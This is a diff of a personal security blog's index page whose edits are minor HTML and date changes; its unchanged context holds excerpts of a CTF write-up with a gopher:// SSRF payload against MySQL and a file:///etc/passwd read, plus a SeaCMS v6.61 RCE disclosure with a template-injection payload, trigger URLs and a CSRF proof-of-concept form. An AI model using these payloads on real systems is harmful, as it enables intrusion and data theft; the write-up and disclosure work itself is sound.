@@ -175,7 +175,7 @@
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
   
   
@@ -186,7 +186,7 @@
   page-home">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
@@ -312,20 +312,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/isitdtuctf-web-writeup/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -380,7 +380,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -397,14 +397,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
 
                 
                 
                   , 
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
 
                 
                 
@@ -458,9 +458,9 @@
 <p></p><p>可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入<code>file:///etc/passwd</code>，结果题目返回：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> “config.php”;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[‘url’])&amp;&amp;!<span class="keyword">empty</span>($_POST[‘url’]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_POST[‘url’];</span><br><span class="line">    $content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $content_url = “”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘debug’]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
 <p></p><p><code>file://localhost/var/www/html/config.php</code></p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$hosts = “localhost”;</span><br><span class="line">$dbusername = “ssrf_user”;</span><br><span class="line">$dbpasswd = “”;</span><br><span class="line">$dbname = “ssrf”;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$dbinit = “create table <span class="keyword">if</span> not exists flag(secret varchar(<span class="number">100</span>));”;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($tmpurl != “localhost” <span class="keyword">and</span> $tmpurl != “<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line"><span class="keyword">die</span>(“&lt;h1&gt;Only access to localhost&lt;/h1&gt;”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = “curl “.$url;</span><br><span class="line"><span class="keyword">echo</span> $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
 <p></p><p>可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道<a href="http://www.freebuf.com/articles/web/159342.html">使用gopher协议攻击mysql的题目</a>。</p><p></p>
-<p></p><p>这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br><br>因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br><br>首先我们创建相同的用户和同样的表结构：<img class="aligncenter" title="database" alt="database" src="https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png">然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br><img class="aligncenter" alt="" src="https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png"><br><img class="aligncenter" alt="" src="https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png">wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br><img class="aligncenter" alt="" src="https://p3.ssl.qhimg.com/t011d0763eeb24df413.png">将数据复制下来转换成urlencode的形式，构造gopher的链接为：</p><p></p>
+<p></p><p>这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br><br>因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br><br>首先我们创建相同的用户和同样的表结构：<img class="aligncenter" title="database" alt="database" src="https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png">然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br><img class="aligncenter" alt src="https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png"><br><img class="aligncenter" alt src="https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png">wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br><img class="aligncenter" alt src="https://p3.ssl.qhimg.com/t011d0763eeb24df413.png">将数据复制下来转换成urlencode的形式，构造gopher的链接为：</p><p></p>
 <p><pre><code>gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01<br></code></pre></p>
-<p></p><p>最后可以在回显中获取flag<br><img class="aligncenter" alt="" src="https://p5.ssl.qhimg.com/t019c4894b8888e1928.png"></p><p></p>
+<p></p><p>最后可以在回显中获取flag<br><img class="aligncenter" alt src="https://p5.ssl.qhimg.com/t019c4894b8888e1928.png"></p><p></p>
 <p></p><p> </p><p></p>
 <p></p><h2 name="h2-2" id="h2-2">NNService</h2><p></p>
 <p><blockquote><p><a href="http://35.240.231.243/">题目地址</a></p></blockquote></p>
@@ -519,20 +519,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -587,7 +587,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -604,14 +604,14 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
 
                 
                 
                   , 
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
 
                 
                 
@@ -649,9 +649,9 @@
           
             <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
 <ul>
-<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
-<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
-<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
+<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt></li>
+<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt></li>
+<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt></li>
 <li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
 </ul>
 <p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
@@ -704,20 +704,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -772,7 +772,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
